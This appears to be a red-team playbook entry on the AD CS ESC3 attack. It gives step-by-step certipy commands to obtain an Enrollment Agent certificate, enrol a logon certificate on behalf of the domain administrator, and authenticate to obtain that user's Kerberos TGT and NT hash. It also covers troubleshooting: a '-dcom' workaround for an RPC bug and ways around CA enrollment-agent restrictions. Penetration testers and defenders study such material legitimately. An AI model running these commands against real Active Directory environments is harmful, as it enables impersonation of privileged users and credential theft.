# ADCS ESC3 — Enrollment Agent On-Behalf-Of

## When this applies

- A template grants you (or a group you control) Enroll **and** carries the **Certificate Request Agent** EKU (e.g. `EnrollmentAgent`, `EnrollmentAgentOffline`).
- A second template with a client-auth EKU (Client Authentication / Smart Card Logon / PKINIT / Any Purpose) that an enrollment agent may enrol on behalf of others.
- Goal: get an Enrollment Agent cert, then use it to request a logon cert **on behalf of** a privileged user → PKINIT/Schannel as that user.

## Technique

Two steps: (1) enrol the agent template to obtain a Cert-Request-Agent cert; (2) use `-pfx <agent>` + `-on-behalf-of '<DOM>\<victim>'` to enrol a client-auth template as the victim, then `certipy auth` for the victim's TGT/NT hash.

## Steps

```bash
export KRB5_CONFIG=/tmp/krb5.conf KRB5CCNAME=agent_user.ccache
# 1. Agent cert (principal must be allowed to enrol the Cert-Request-Agent template)
certipy req -k -no-pass -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' \
  -template EnrollmentAgent -dcom -out agent
# 2. On-behalf-of a privileged user, against a client-auth template
certipy req -k -no-pass -dc-ip <DC_IP> -target <DC_FQDN> -ca '<CA_NAME>' \
  -template User -on-behalf-of '<DOM_NETBIOS>\administrator' -pfx agent.pfx -dcom -out administrator
# 3. Authenticate as the victim
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>      # PKINIT → TGT + NT hash
```

## CRITICAL — certipy on-behalf RPC bug → use `-dcom`

The on-behalf request over impacket's default DCERPC transport (`ncacn_np` named pipe, and also `-dynamic-endpoint` TCP) frequently dies with:

```
Got error ... 0x80010117 - RPC_E_CALL_COMPLETE - Call context cannot be accessed after call completed
```

— the cert is submitted (Request ID assigned) but never returned, and `-retrieve <id>` also fails. This is an impacket DCERPC response-parse bug (reproduces certipy 4.8.x **and** 5.x, macOS **and** Linux, named-pipe **and** TCP). **Fix: add `-dcom`** (ICertRequestD2 over DCOM) to both `req` steps — the on-behalf cert then issues cleanly. `-on-behalf-of` wants the NetBIOS form `DOM\user`, not a FQDN.

## Common pitfalls

- The on-behalf TARGET template must be agent-enrollable and the CA's enrollment-agent restrictions must permit (agent's group → template/target). `0x80094009 CERTSRV_E_RESTRICTEDOFFICER` = the CA restricts which agents may enrol for that target — pick a target the restriction allows (often a specific group, not Administrator directly).
- The agent/impersonated account must be ENABLED to PKINIT-auth; enable a disabled one first (or choose an enabled target).
- If PKINIT fails after issuance, fall back to Schannel LDAPS — see [certipy-ldap-shell-fallback.md](certipy-ldap-shell-fallback.md).

## Tools

- certipy (`req -template … -on-behalf-of … -pfx … -dcom`, `auth`)
